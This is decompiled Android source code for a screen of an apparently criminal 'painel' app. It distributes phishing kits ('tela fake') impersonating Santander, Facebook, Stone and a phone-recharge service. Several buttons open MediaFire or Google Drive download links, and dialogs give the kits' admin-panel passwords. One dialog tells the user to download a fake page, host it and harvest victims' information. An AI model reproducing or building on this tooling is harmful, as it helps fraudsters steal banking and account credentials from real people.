package com.br.painel;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Bundle;
import android.util.SparseBooleanArray;
import android.util.TypedValue;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.FirebaseApp;
import java.util.ArrayList;
import java.util.Random;

/* loaded from: classes2.dex */
public class TelasfkActivity extends AppCompatActivity {
    private Button button1;
    private Button button10;
    private Button button11;
    private Button button2;
    private Button button3;
    private Button button4;
    private Button button5;
    private Button button6;
    private Button button7;
    private Button button8;
    private Button button9;
    private AlertDialog.Builder d1;
    private ImageView imageview1;
    private ImageView imageview2;
    private ImageView imageview52;
    private LinearLayout linear115;
    private LinearLayout linear116;
    private LinearLayout linear117;
    private LinearLayout linear118;
    private SharedPreferences navegador;
    private TextView textview1;
    private TextView textview5;
    private ScrollView vscroll1;
    private Intent i1 = new Intent();
    private Intent l77 = new Intent();

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.telasfk);
        initialize(bundle);
        FirebaseApp.initializeApp(this);
        initializeLogic();
    }

    private void initialize(Bundle bundle) {
        this.linear115 = (LinearLayout) findViewById(R.id.linear115);
        this.vscroll1 = (ScrollView) findViewById(R.id.vscroll1);
        this.imageview1 = (ImageView) findViewById(R.id.imageview1);
        this.textview1 = (TextView) findViewById(R.id.textview1);
        this.imageview52 = (ImageView) findViewById(R.id.imageview52);
        this.linear116 = (LinearLayout) findViewById(R.id.linear116);
        this.linear117 = (LinearLayout) findViewById(R.id.linear117);
        this.linear118 = (LinearLayout) findViewById(R.id.linear118);
        this.button1 = (Button) findViewById(R.id.button1);
        this.button2 = (Button) findViewById(R.id.button2);
        this.button3 = (Button) findViewById(R.id.button3);
        this.button4 = (Button) findViewById(R.id.button4);
        this.button5 = (Button) findViewById(R.id.button5);
        this.button6 = (Button) findViewById(R.id.button6);
        this.button7 = (Button) findViewById(R.id.button7);
        this.button8 = (Button) findViewById(R.id.button8);
        this.button9 = (Button) findViewById(R.id.button9);
        this.button10 = (Button) findViewById(R.id.button10);
        this.button11 = (Button) findViewById(R.id.button11);
        this.textview5 = (TextView) findViewById(R.id.textview5);
        this.imageview2 = (ImageView) findViewById(R.id.imageview2);
        this.d1 = new AlertDialog.Builder(this);
        this.navegador = getSharedPreferences("navegador", 0);
        this.imageview1.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.finish();
            }
        });
        this.imageview52.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.2
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://t.me/+vNQEYRbbcaMzNWQ5"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button1.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.3
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.d1.setTitle("TELA SANTANDER ");
                TelasfkActivity.this.d1.setIcon(R.drawable.jjnn);
                TelasfkActivity.this.d1.setMessage("♨️𝐓𝐄𝐋𝐀 𝐅𝐀𝐊𝐄 𝐒𝐀𝐍𝐓𝐀𝐍𝐃𝐄𝐑 𝐈𝐍𝐅𝐎𝐁𝐀𝐍𝐊𝐄𝐑♨️\n\nLOGIN DO PAINEL: Euronymous\nSENHA DO PAINEL: Crypter\n\nby: @blackhatbrasil\n       @blackhatbrasilgroup");
                TelasfkActivity.this.d1.setPositiveButton("BAIXAR", new DialogInterface.OnClickListener() { // from class: com.br.painel.TelasfkActivity.3.1
                    @Override // android.content.DialogInterface.OnClickListener
                    public void onClick(DialogInterface dialogInterface, int i) {
                        TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                        TelasfkActivity.this.i1.setData(Uri.parse("https://www.mediafire.com/file/nmwdu78mz1fto0c/FACEBOOK_%252B_PAINEL_ADMIN.rar/file"));
                        TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
                    }
                });
                TelasfkActivity.this.d1.create().show();
            }
        });
        this.button2.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.4
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.d1.setTitle("TELA FACEBOOK ");
                TelasfkActivity.this.d1.setIcon(R.drawable.jjnn);
                TelasfkActivity.this.d1.setMessage("TELA FAKE FACEBOOK COM OPERADOR \nPRA ACESSAR O OPERADOR E SO COLOCAR SUAURL/OPERADOR USUARIO E SENHA DO OPERADOR\n\nUSUARIO:delta\nSENHA:102030\n\nBY: @escoladaweb");
                TelasfkActivity.this.d1.setPositiveButton("BAIXAR", new DialogInterface.OnClickListener() { // from class: com.br.painel.TelasfkActivity.4.1
                    @Override // android.content.DialogInterface.OnClickListener
                    public void onClick(DialogInterface dialogInterface, int i) {
                        TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                        TelasfkActivity.this.i1.setData(Uri.parse("https://www.mediafire.com/file/nmwdu78mz1fto0c/FACEBOOK_%252B_PAINEL_ADMIN.rar/file"));
                        TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
                    }
                });
                TelasfkActivity.this.d1.create().show();
            }
        });
        this.button3.setOnLongClickListener(new View.OnLongClickListener() { // from class: com.br.painel.TelasfkActivity.5
            @Override // android.view.View.OnLongClickListener
            public boolean onLongClick(View view) {
                return true;
            }
        });
        this.button3.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.6
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://www.mediafire.com/file/9z3wwwyz2ba7bjx/tela_fake_stone.zip/file"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button4.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.7
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.d1.setTitle("TELA RECARGA");
                TelasfkActivity.this.d1.setIcon(R.drawable.jjnn);
                TelasfkActivity.this.d1.setMessage("💢𝐓𝐄𝐋𝐀 𝐅𝐀𝐊𝐄 𝐃𝐄 𝐑𝐄𝐂𝐀𝐑𝐆𝐀 𝐃𝐄 𝐂𝐄𝐋𝐔𝐋𝐀𝐑 💢\n\nLOGIN DO PAINEL: hypn\nSENHA DO PAINEL: hypn2023\n\nby: @blackhatbrasil\n       @blackhatbrasilgroup");
                TelasfkActivity.this.d1.setPositiveButton("BAIXAR", new DialogInterface.OnClickListener() { // from class: com.br.painel.TelasfkActivity.7.1
                    @Override // android.content.DialogInterface.OnClickListener
                    public void onClick(DialogInterface dialogInterface, int i) {
                        TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                        TelasfkActivity.this.i1.setData(Uri.parse("https://www.mediafire.com/file/jc3bpqijhf5872w/Recarga2.rar/file"));
                        TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
                    }
                });
                TelasfkActivity.this.d1.create().show();
            }
        });
        this.button5.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.8
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://drive.google.com/file/d/1iSWXNx6sgiMDlZEokovToQ2Lh5O0QKrY/view"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button6.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.9
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://drive.google.com/file/d/1FRG2OhPj3vKexcV6A2-OA60MkuMNFB22/view"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button7.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.10
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://drive.google.com/file/d/1wU3MaHpf38edEhwsFj4lHw0EX4UyVfKt/view?usp=drivesdk"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button8.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.11
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://drive.google.com/file/d/1r6RmZszVo5w7PtFvUYvrcreLEFTwJRjX/view"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button9.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.12
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://drive.google.com/file/d/1KdZoJkCycDiHJgxj3X6j8PqHST0AyNN1/view"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button10.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.13
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://drive.google.com/file/d/1RCy3LuqLQ7hE5BhRlE0Qd1wqCFXL1s6H/view"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.button11.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.14
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.i1.setAction("android.intent.action.VIEW");
                TelasfkActivity.this.i1.setData(Uri.parse("https://drive.google.com/file/d/1Og4SaFh-KGhKlADQACTTVvqp8qHTeOLf/view"));
                TelasfkActivity.this.startActivity(TelasfkActivity.this.i1);
            }
        });
        this.imageview2.setOnClickListener(new View.OnClickListener() { // from class: com.br.painel.TelasfkActivity.15
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                TelasfkActivity.this.d1.setTitle("AQUI VOCÊ ENCONTRA TELAS FK");
                TelasfkActivity.this.d1.setIcon(R.drawable.b5184592);
                TelasfkActivity.this.d1.setMessage("⚠️ATENÇÃO⚠️\n\n1-BAIXE A TELA FAKE\n\n2-HOSPEDE ELA \n\n3-AGR É SO COLHER AIS INFORMAÇÕES \n\nRISCO DE BO, USE COM MODERAÇÃO    ");
                TelasfkActivity.this.d1.setPositiveButton("ok", new DialogInterface.OnClickListener() { // from class: com.br.painel.TelasfkActivity.15.1
                    @Override // android.content.DialogInterface.OnClickListener
                    public void onClick(DialogInterface dialogInterface, int i) {
                    }
                });
                TelasfkActivity.this.d1.create().show();
            }
        });
    }

    /* JADX WARN: Type inference failed for: r1v0, types: [com.br.painel.TelasfkActivity$16] */
    /* JADX WARN: Type inference failed for: r1v10, types: [com.br.painel.TelasfkActivity$21] */
    /* JADX WARN: Type inference failed for: r1v12, types: [com.br.painel.TelasfkActivity$22] */
    /* JADX WARN: Type inference failed for: r1v14, types: [com.br.painel.TelasfkActivity$23] */
    /* JADX WARN: Type inference failed for: r1v16, types: [com.br.painel.TelasfkActivity$24] */
    /* JADX WARN: Type inference failed for: r1v18, types: [com.br.painel.TelasfkActivity$25] */
    /* JADX WARN: Type inference failed for: r1v2, types: [com.br.painel.TelasfkActivity$17] */
    /* JADX WARN: Type inference failed for: r1v20, types: [com.br.painel.TelasfkActivity$26] */
    /* JADX WARN: Type inference failed for: r1v4, types: [com.br.painel.TelasfkActivity$18] */
    /* JADX WARN: Type inference failed for: r1v6, types: [com.br.painel.TelasfkActivity$19] */
    /* JADX WARN: Type inference failed for: r1v8, types: [com.br.painel.TelasfkActivity$20] */
    private void initializeLogic() {
        this.button1.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.16
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button2.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.17
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button3.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.18
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button4.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.19
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button5.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.20
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button6.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.21
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button7.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.22
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button8.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.23
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button9.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.24
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button10.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.25
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
        this.button11.setBackground(new GradientDrawable() { // from class: com.br.painel.TelasfkActivity.26
            public GradientDrawable getIns(int i, int i2, int i3, int i4) {
                setCornerRadius(i);
                setStroke(i2, i3);
                setColor(i4);
                return this;
            }
        }.getIns(25, 4, -14606047, -14606047));
    }

    @Deprecated
    public void showMessage(String str) {
        Toast.makeText(getApplicationContext(), str, 0).show();
    }

    @Deprecated
    public int getLocationX(View view) {
        int[] iArr = new int[2];
        view.getLocationInWindow(iArr);
        return iArr[0];
    }

    @Deprecated
    public int getLocationY(View view) {
        int[] iArr = new int[2];
        view.getLocationInWindow(iArr);
        return iArr[1];
    }

    @Deprecated
    public int getRandom(int i, int i2) {
        return new Random().nextInt((i2 - i) + 1) + i;
    }

    @Deprecated
    public ArrayList<Double> getCheckedItemPositionsToArray(ListView listView) {
        ArrayList<Double> arrayList = new ArrayList<>();
        SparseBooleanArray checkedItemPositions = listView.getCheckedItemPositions();
        for (int i = 0; i < checkedItemPositions.size(); i++) {
            if (checkedItemPositions.valueAt(i)) {
                arrayList.add(Double.valueOf(checkedItemPositions.keyAt(i)));
            }
        }
        return arrayList;
    }

    @Deprecated
    public float getDip(int i) {
        return TypedValue.applyDimension(1, i, getResources().getDisplayMetrics());
    }

    @Deprecated
    public int getDisplayWidthPixels() {
        return getResources().getDisplayMetrics().widthPixels;
    }

    @Deprecated
    public int getDisplayHeightPixels() {
        return getResources().getDisplayMetrics().heightPixels;
    }
}
